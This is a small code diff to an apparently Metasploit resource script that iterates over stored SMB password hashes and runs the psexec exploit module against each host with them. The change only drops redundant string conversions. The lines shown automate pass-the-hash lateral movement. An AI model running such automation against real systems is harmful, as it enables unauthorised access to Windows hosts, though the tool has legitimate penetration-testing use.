@@ -43,7 +43,7 @@ end
 def infos(serv,creds,host)
 	print_line("")
 	print_line("====================================")
-	print_line("IP: #{host.address.to_s}")
+	print_line("IP: #{host.address}")
 	print_line("OS: #{host.os_name}")
 	print_line("Servicename: #{serv.name}")
 	print_line("Service Port: #{serv.port.to_i}")
@@ -88,7 +88,7 @@ framework.db.creds.each do |creds|	# just checking if we have any smb_hashes in 
 				infos(serv,creds,host)
 			end
 			run_single("use exploit/windows/smb/psexec")
-			run_single("set RHOST #{host.address.to_s}")
+			run_single("set RHOST #{host.address}")
 			run_single("set RPORT #{serv.port}")
 			run_single("set SMBUser #{username}")
 			run_single("set SMBPass #{smbhash}")
